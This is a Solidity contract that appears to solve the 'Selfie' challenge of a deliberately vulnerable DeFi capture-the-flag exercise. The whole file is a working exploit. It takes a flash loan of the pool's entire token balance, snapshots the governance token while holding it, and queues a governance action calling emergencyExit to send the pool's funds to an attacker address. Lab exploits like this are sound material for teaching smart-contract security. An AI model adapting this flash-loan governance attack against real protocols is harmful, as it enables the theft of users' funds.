pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

contract SelfieAttack is IERC3156FlashBorrower {

    ERC20Snapshot public immutable token;
    SimpleGovernance public immutable governance;
    SelfiePool public immutable pool;
    address attacker;

    constructor(address _token, address _governance, address _pool, address _attacker) {
        token = ERC20Snapshot(_token);
        governance = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
        attacker = _attacker;
    }

    function attack() external {
        uint256 amount = pool.maxFlashLoan(address(token));
        token.approve(address(pool), type(uint256).max);
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amount, "0x00000000000000");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {

        DamnValuableTokenSnapshot(address(token)).snapshot();
        governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", attacker));

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

}